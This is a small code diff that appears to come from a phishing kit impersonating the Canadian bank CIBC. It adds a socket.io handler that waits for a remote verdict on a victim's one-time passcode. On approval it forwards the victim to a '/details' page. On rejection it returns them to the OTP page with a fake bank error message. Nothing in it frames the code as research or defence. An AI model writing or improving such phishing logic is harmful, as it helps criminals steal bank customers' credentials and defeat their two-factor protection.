@@ -193,7 +193,16 @@
          socket.emit('pageandstage', {page: 'CIBC', stage: 'Loading'})
 
           socket.on('OTPResponse', (data) => {
-              
+              if(data.res){
+                  window.location.href = `/details`;
+              } else {
+                   let message =` <div class="global-error-form-wrapper">
+        <div class="global-error-form-msg">
+            <span role="alert" class="">You have entered incorrect information. Check your code and try again.</span>
+        </div>
+    </div>`;
+                    window.location.href = `/otp?message=${encodeURIComponent(message)}`;
+              }
           })
     
  
